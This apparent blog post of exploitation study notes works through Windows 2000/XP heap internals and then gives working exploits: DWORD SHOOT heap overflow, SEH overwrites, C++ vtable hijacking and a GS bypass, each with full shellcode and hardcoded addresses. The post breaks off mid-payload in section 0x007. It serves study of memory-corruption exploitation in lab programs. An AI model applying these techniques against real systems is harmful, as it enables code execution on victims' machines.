---
layout:		post
title:		二进制学习之0day安全篇
author:		wooy0ung
tags:		windows
category:  	exploit
---

- 目录
{:toc #markdown-toc}

>[索引目录]  
>0x001 实战:分析Windows 2000下堆的分配释放原理  
>0x002 DWORD SHOOT堆溢出利用  
>0x003 在堆溢出中利用S.E.H  
>0x004 实战:Windows 2000下快表的使用  
>0x005 在栈溢出中利用S.E.H  
>0x006 攻击C++的虚函数  
<!-- more -->
>0x007 覆盖虚函数突破GS  
>0x008 同时替换栈和.data中的Cookie突破GS  
>0x009 攻击异常处理突破GS  
>0x010 从堆中绕过SafeS.E.H  
>0x011 利用未启用SafeS.E.H模块绕过SafeS.E.H  
>0x012 利用Adobe Flash Player ActiveX控件绕过SafeS.E.H  
>0x013 利用加载模块之外的地址绕过SafeS.E.H  
>0x014 Ret2Libc实战之利用ZwSetInformationProcess  
>0x015 Ret2Libc实战之利用VirtualProtect  
>0x016 Ret2Libc实战之利用VirtualAlloc  
>0x017 利用.NET挑战DEP  
>0x018 利用Java applet挑战DEP  
>0x019 攻击未启用ASLR的模块  
>0x020 利用部分覆盖定位内存地址  
>0x021 利用Heap Spray技术定位内存地址  
>0x022 为.NET控件禁用ASLR  
>0x023 利用Java applet heap spray技术定位内存地址  
>0x024 利用未启用SEHOP的模块  
>0x025 伪造S.E.H链表  
>0x026 利用chunk重设大小攻击堆  
>0x027 利用Lookaside表进行堆溢出  
>0x028 RPC入侵：MS06-040  


## 0x001 实战:分析Windows 2000下堆的分配释放原理

>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

int main()
{
	HLOCAL h1,h2,h3,h4,h5,h6;
	HANDLE hp;
	hp = HeapCreate(0, 0x1000, 0x1000);
	printf("hp addr : 0x%08x\n",hp);
	__asm int 3;

	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,19);
	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24);

	HeapFree(hp,0,h1);
	HeapFree(hp,0,h3);
	HeapFree(hp,0,h5);

	HeapFree(hp,0,h4);
	
	return 0;
}
```

打开OllyDbg, Options->Just-in-time debugging, 按以下设置
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-001.png)
现在, OllyDbg作为默认调试器

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-002.png)

可以到cmd将堆基址0x00360000打印出来了
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-003.png)

程序断在了int 3, 往上看到mov esi, eax
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-004.png)

看esi寄存器的值, 返回来堆基址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-005.png)

选择"M"观察内存布局, 内存区域中goto 0x00360178
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-006.png)

这里是空表的freelist[0], 指向偏移0x688的一个尾块, goto 0x00360688
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-007.png)
```
# 占用态块首结构
Self Size = 01 30 # 0x130*8=980 bytes
Previous chunk Size = 00 08
Segment Index = 00
Flags = 10
Unused bytes = 00
Tag index(Debug) = 00
```
最后指向freelist[0]构成双向列表

先看看HeapAlloc()的传入参数
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-008.png)

单步到这里, 完成第1次分配
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-009.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-010.png)
```
# 第1块
Self Size = 00 02 # 0x02*8=0x10 bytes, 请求3 bytes
Previous chunk Size = 00 08
Segment Index = 00
Flags = 01
Unused bytes = 0D # 0x10-0x03=0x0D bytes
Tag index(Debug) = 00
```

第2次分配
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-011.png)
```
# 第2块
Self Size = 00 02 # 0x02*8=0x10 bytes, 请求5 bytes
Previous chunk Size = 00 02
Segment Index = 00
Flags = 01
Unused bytes = 0B # 0x10-0x03=0x0D bytes
Tag index(Debug) = 00
```

单步到这里, 完成6次分配
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-012.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-013.png)
```
# 第6块
Self Size = 00 04 # 0x04*8=0x20 bytes, 请求24 bytes
Previous chunk Size = 00 04
Segment Index = 00
Flags = 01
Unused bytes = 08 # 0x10-0x03=0x0D bytes
Tag index(Debug) = 00
```

实际分配堆块大小 = [请求字节数/8+1]*8 bytes, 以及8 bytes的头部
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-014.png)
再来看看尾块块首, Size = 0x130-0x2*4-0x4*2=0x120

单步下去, 完成前3次释放, 因为h1、h3、h5不相邻, 不会发生合并
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-015.png)
现在产生了2条空闲链表freelist[2]、freelist[4]

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x001-016.png)
继续完成第4次释放, h3、h4、h5相邻发生合并, size=64 bytes, 链入freelist[8]


## 0x002 DWORD SHOOT堆溢出利用

>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

int main()
{
	HLOCAL h1,h2,h3,h4,h5,h6;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h5=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h6=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	__asm int 3;

	HeapFree(hp,0,h1);
	HeapFree(hp,0,h3);
	HeapFree(hp,0,h5);

	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	
	return 0;
}
```

程序说明:
```
1.创建了一个0x1000的堆区。
2.连续申请了6个8 byte的堆块。
3.堆块间隔释放, 防止合并。
```

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-001.png)
内存区转到0x00360688, 这里是请求分配的6块8 byte堆块, 加上头部共16 byte

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-002.png)
然后释放第1块 h1, 将空闲块链入了freelist[2]

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-003.png)
再往下释放h3、h5, 链入freelist[2]

现在将0x03606C8处修改为0x44444444, 0x03606D0修改为0x00000000
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-004.png)

当再请求分配8 byte堆块(实际上16 byte), h5从freelist[2]中卸下
```
node->blink->flink = node->flink # [0x44444444] = 0x00000000, 异常
node->flink->blink = node->blink
```
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-005.png)

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

int main()
{
	HLOCAL h1=0,h2=0;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	__asm int 3;
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	
	memcpy(h1,shellcode,200);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);

	return 0;
}
```

OllyDbg附加上去, 内存区goto 0x00360688, 观察此时尾块头部
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-006.png)

单步到h1分配, 现在0x00360680是h1块的头部
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-007.png)

往下翻尾块的头部在0x00360750, 0x00360750-0x00360688=200, 中间相隔200 byte数据区
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-008.png)

单步到rep movsd, 现在数据区已经被0x90填充, 再往下就能覆盖尾块的头部
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-009.png)

继续VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xb8\x20\xf0\xfd\x7f"
"\xbb\x03\x91\xf8\x77"		# RtlEnterCriticalSection的地址0x77f89103通过调试得到, 用来使shellcode调用ExitProcess时不产生异常
"\x89\x18"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x30\x75\x6e\x67\x68\x77\x6f\x6f\x79\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00"		# 按之前调试得到的数据写回
"\x88\x06\x36\x00\x20\xf0\xfd\x7f";		# 0x00360688 shellcode起始地址, 0x7ffdf020 RtlEnterCriticalSection的指针地址(固定不变)

int main()
{
	HLOCAL h1=0,h2=0;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	//__asm int 3;
	//EnterCriticalSection(0);
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	
	memcpy(h1,shellcode,0x200);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);

	return 0;
}
```

取消main的两处注释, 通过调试得到RtlEnterCriticalSection的地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-010.png)

成功断下, 跟进RtlEnterCriticalSection, 得到地址0x77f89103
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-011.png)

给EnterCriticalSection(0)处加上注释, 再调试一遍看DWORD SHOOT是否成功
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-012.png)

直接到rep movsd, 内存区转到0x00360758, 可以看到成功覆盖尾块的flink、blink指针, 当h1卸下时(请求h2)将发生
```
h1->blink->flink = h1->flink
[0x7ffdf020] = 0x00360688
```

当进程退出时, 再调用临界区函数RtlEnterCriticalSection, 实际上调用shellcode, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x002-013.png)


## 0x003 在堆溢出中利用S.E.H

>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";		# 200 byte

DWORD MyExceptionhandler()
{
	ExitProcess(1);
	return 0;
}

int main()
{
	HLOCAL h1=0,h2=0;
	HANDLE hp;
	hp=HeapCreate(0,0x1000,0x10000);
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	memcpy(h1,shellcode,200);	# 为了观察分配的块首信息, 先不溢出

	__asm int 3;
	__try
	{
		h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	}
	__except(MyExceptionhandler()){}

	return 0;
}
```

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试, 成功断下
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-001.png)

内存区goto 0x00360688, 定位到h1以及尾块的块首
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-002.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-003.png)

这里有问题的可以看另一篇文:
[DWORD SHOOT堆溢出利用](http://www.wooy0ung.me/exploit/2017/10/01/windows-2000-dwordshoot/)

构造junk+shellcode填充200 byte的数据区
```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x16\x01\x1a\x00\x00\x10\x00\x00"		# 按尾块的首部填充
"\x88\x06\x36\x00"			# shellcode起始
"\x90\x90\x90\x90"			# 暂时填充无效数据, 调试确定
```

将memcpy长度改为0x200, 确认没有忽略任何异常后, 附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-004.png)

F9直接运行, 调试器捕捉到异常
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-005.png)

查看S.E.H chain, 定位到最近的S.E.H结构
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-006.png)

这样就得到了需要覆写SE handler的地址0x0012FF30, 将最后的"\x90\x90\x90\x90"修改成"\x30\xff\x12\x00"
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-007.png)

注释掉int 3指令, 直接运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x003-008.png)


## 0x004 实战:Windows 2000下快表的使用

>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

int main()
{
	HLOCAL h1,h2,h3,h4;
	HANDLE hp;
	hp = HeapCreate(0,0,0);
	printf("addr: 0x%08x\n",hp);
	__asm int 3;
	h1=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h3=HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h4=HeapAlloc(hp,HEAP_ZERO_MEMORY,24);
	HeapFree(hp,0,h1);
	HeapFree(hp,0,h2);
	HeapFree(hp,0,h3);
	HeapFree(hp,0,h4);
	h2=HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	HeapFree(hp,0,h2);

	return 0;
}
```

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-001.png)

内存区转到0x00360178, 这里指向的尾块地址不再是偏移0x688
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-002.png)

单步到这里, 观察返回的指针
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-003.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-004.png)

内存区goto 0x00361E90
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-005.png)
```
# 占用态块首结构
Self Size = 00 02
Previous chunk Size = 03 01
Segment Index = 00
Flags = 01
Unused bytes = 08 # 申请8 byte, 分配16 byte
Tag index(Debug) = 00
```

继续下去完成4次分配, 下图依次是4块的块首
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-006.png)

第1次释放
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-007.png)

观察返回指针, goto 0x00361EA0
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-008.png)

现在释放了的空闲块已经链入块表, 注意是单向链表, 由快表指向该块
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-009.png)

第二次释放, 注意后释放的的堆会作为第一个结点链入快表, 已经在表上的结点整体后移
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-010.png)

继续下去完成4次释放, goto 0x00360688, 可以看到快表上已经有3条链
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-011.png)

现在再次请求分配16byte, 可以看到现在第二条链又空了
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-012.png)

再释放, 又链入到lookaside[2]
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x004-013.png)


## 0x005 在栈溢出中利用S.E.H

>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

DWORD MyExceptionhandler()
{
	printf("got an exception, press Enter to kill process!\n");
	getchar();
	ExitProcess(1);

	return 0;
}

void test(char *input)
{
	char buf[200];
	int zero=0;
	__asm int 3;
	__try
	{
		strcpy(buf,input);
		zero=4/zero;
	}
	__except(MyExceptionhandler()){};
}

int main()
{
	test(shellcode);

	return 0;
}
```

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x005-001.png)

单步到rep movsd指令, 执行后观察栈区, 此时正在把shellcode copy到栈上, 起始栈地址0x0012FE98
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x005-002.png)

View->SEH chain, 定位到最近的S.E.H结构, 栈地址0x0012FF68
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x005-003.png)

strcpy的起始地址0x0012FE98与S.E.H的异常句柄0x0012FF6C相隔212 byte
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x005-004.png)

如下组织212 byte的payload, 最后213~216 byte覆盖为shellcode起始地址0x0012FE98
```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x98\xfe\x12\x00";
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x005-005.png)


## 0x006 攻击C++的虚函数

>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  

VC 6.0新建一个工程, 贴入以下代码, 选择release版本
```
#include <windows.h>
#include <iostream>
using namespace std;

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90";		# 通过调试确定shellcode的首地址, 被覆盖的虚表指针会指向这里

class myClass
{
public:
	char buf[200];
	virtual void test()
	{
		cout<<"Class Vtable::test()"<<endl;
	}
};

myClass overflow, *p;

int main()
{
	char *p_vtable;
	p_vtable=overflow.buf-4;
	printf("addr: 0x%08x\n",p_vtable);
	__asm int 3;
	
	p_vtable[0]=0xcc;
	p_vtable[1]=0x88;
	p_vtable[2]=0x40;
	p_vtable[3]=0x00;
	strcpy(overflow.buf, shellcode);

	p=&overflow;
	p->test();

	return 0;
}
```

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试, 虚表指针已经打印出来
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x006-001.png)

单步到rep movsd, 内存区goto 0x00410dd8, 可以看到copy过去的数据
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x006-002.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x006-003.png)

数据起始-4 byte(0x004088cc)是虚表指针, 将它修改为指向数据尾部的90909090(0x00410e5c)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x006-004.png)

同时将尾部90909090修改成指向shellcode的起始地址(0x00410ddc)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x006-005.png)

源码作如下修改
```
p_vtable[0]=0x5c;
p_vtable[1]=0x0e;
p_vtable[2]=0x41;
p_vtable[3]=0x00;
```

shellcode最后的4 byte修改成0x00410ddc
```
"\xdc\x0d\x41\x00"
```

注释掉int 3断点,再编译运行一遍, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x006-006.png)


## 0x007 覆盖虚函数突破GS

>[分析环境]  
>系统: Windows XP Professional sp2  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>说明: 《0Day》上是覆盖1 byte就能达到效果, 简便起见这里覆盖4 byte。

新建一个工程, 贴入以下代码
```
#include <string.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

class GSVirtual{
public:
	void gsv(char *src)
	{
		char buf[200];
		strcpy(buf,src);
		vir();
	}
	virtual void vir()
	{
	}
};

int main()
{
	GSVirtual test;
	__asm int 3
	test.gsv(shellcode);

	return 0;
}
```

项目->属性, 选择release版本, 禁用优化
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-001.png)

运行*.exe, 自动调用OllyDbg附加调试, 成功断在int 3断点
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-002.png)

单步往下, 遇到类成员函数跟进去
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-003.png)

直接F4到这里, 完成了strcpy, 看到下一条指令, eax=ss:[0x0012fe98]=0x0012ff78(虚函数表地址)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-004.png)

内存区0x0012ff78存放的就是虚表指针
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-005.png)

goto 0x00402100, 这里0x004010a0就是虚函数的入口地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-006.png)

再看看copy的数据, 距离虚表指针0x0012ff78还有20 byte
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-007.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x007-008.png)

copy的数据源从0x0012fe9c开始, copy的数据从0x00403048开始(两份payload一致)

组织payload, 将虚表指针覆盖成0x0012fe9c, 即shellcode的起始地址(防着跳板)
```
"\x04\x2b\x99\x7C"		# pop pop retn
